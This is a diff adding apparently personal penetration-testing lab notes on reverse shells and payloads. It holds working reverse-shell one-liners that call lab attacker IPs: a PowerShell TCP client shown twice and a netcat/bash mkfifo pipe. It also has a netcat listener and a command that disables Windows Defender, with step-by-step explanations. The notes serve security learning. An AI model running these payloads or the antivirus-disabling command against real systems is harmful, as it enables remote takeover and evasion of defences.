@@ -91,4 +91,65 @@ nc -nv 10.129.41.200 7777
 ```
 you will notice $ means shell. The exercises helped us understand how a bind shell works without security controls like NAT, firewalls, IDS/IPS, or authentication mechanisms (unrealistic scenario).
 
+## Reverse Shell
+With a reverse shell, the attack box will have a listener running, and the target will need to initiate the connection.
+![image](https://github.com/user-attachments/assets/c8dd1422-d61d-491f-aa91-5defd91c644a)
 
+To establish a reverse shell on a vulnerable system, we rely on outbound connections, as these are often overlooked by admins, increasing the chances of going undetected. Unlike bind shells, which require incoming connections through the firewall on the target side, reverse shells initiate a connection from the target to the attacker's system, with the attacker setting up a listener. Techniques like Unrestricted File Upload or Command Injection can trigger this connection. For payloads, we can use resources like the [Reverse Shell Cheat Sheet](https://swisskyrepo.github.io/InternalAllTheThings/cheatsheets/shell-reverse-cheatsheet/#socat), which provides pre-built commands and tools. However, it's important to customize attacks since security teams may anticipate commonly used payloads from public repositories.
+
+### Reverse Shell example
+__Server (attack box)__ 
+```
+sudo nc -lvnp 443
+```
+Port 443 outbound is rarely blocked this usually for HTTPS. Stronger firewall will detect during layer 7 packet detection and may block connection.
+
+__Client (target windows)__
+```
+powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.14.158',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
+```
+
+This PowerShell code can also be called shell code or our payload. 
+
+an error might occur if windows defender antivirus is active.  For our purposes, we will want to disable the antivirus through the Virus & threat protection settings or by using this command in an administrative PowerShell console (right-click, run as admin):
+
+__Disable AV__
+```
+Set-MpPreference -DisableRealtimeMonitoring $true
+```
+Back on our attack box, we should notice that we successfully established a reverse shell.
+
+# Payloads
+
+## Introduction
+ In information security, it refers to the command or code that exploits a vulnerability in an OS or application, performing a malicious action. For example, as seen in the reverse shells section, Windows Defender blocked the PowerShell payload due to its malicious nature. When delivering and executing payloads, it's essential to understand that we're simply giving the target system instructions, much like any program. Instead of seeing it as mysterious "malicious code," it's important to explore and understand what the payload is actually doing.
+ 
+### Netcat/Bash Reverse Shell One-liner linux
+
+This Netcat/Bash reverse shell one-liner creates a backdoor connection from a target machine to an attacker:
+
+1. **Remove File**: `rm -f /tmp/f;` removes any existing file `/tmp/f`. The `-f` flag ensures no error if the file doesn't exist.
+2. **Create Pipe**: `mkfifo /tmp/f;` makes a special file (named pipe) at `/tmp/f`, which allows data to flow in and out like a channel.
+3. **Read Input**: `cat /tmp/f |` reads data from the pipe and sends it to the next command using a pipe (`|`).
+4. **Start Shell**: `/bin/bash -i 2>&1 |` starts an interactive Bash shell and redirects errors and output to the next command.
+5. **Netcat Connection**: `nc 10.10.14.12 7777 > /tmp/f` connects to the attacker's machine (`10.10.14.12`) on port `7777`, sending the shell's output back through the pipe.
+
+### PowerShell One-liner payload
+```powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.14.158',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
+```
+**powershell -nop -c** Executes powershell.exe with no profile (nop) and executes the command/script block (-c) contained in the quotes. This particular command is issued inside of command-prompt, which is why PowerShell is at the beginning of the command. It's good to know how to do this if we discover a Remote Code Execution vulnerability that allows us to execute commands directly in **cmd.exe**.
+
+1. Establish a Connection: ` $client = New-Object System.Net.Sockets.TCPClient('10.10.14.158',443);` Creates a TCP client that connects to the attacker's machine at IP 10.10.14.158 on port 443.
+2. Get the Network Stream: `$stream = $client.GetStream();` Retrieves the data stream (input/output) from the TCP connection.
+3. Create a Buffer: `[byte[]]$bytes = 0..65535 | % { 0 };` Creates a byte array buffer to store the incoming and outgoing data.
+4. Read Incoming Commands: `while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0)` This loop reads data (commands) sent by the attacker from the TCP stream.
+5. Execute Received Commands: `$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);
+$sendback = (iex $data 2>&1 | Out-String );` Converts the incoming bytes into a string (the command), then executes the command using iex.
+2>&1 captures both errors and output, and Out-String formats it.
+6. Send Command Output Back to Attacker: `$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';
+$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);
+$stream.Write($sendbyte,0,$sendbyte.Length);
+` Prepares the command output and sends it back to the attacker.
+Includes a PowerShell prompt (PS) showing the current directory.
+7. Repeat Until Connection Closes: `$stream.Flush();` Ensures the buffer is fully sent before waiting for the next command.
+8. Close the Connection: `$client.Close();` Closes the TCP connection when finished.
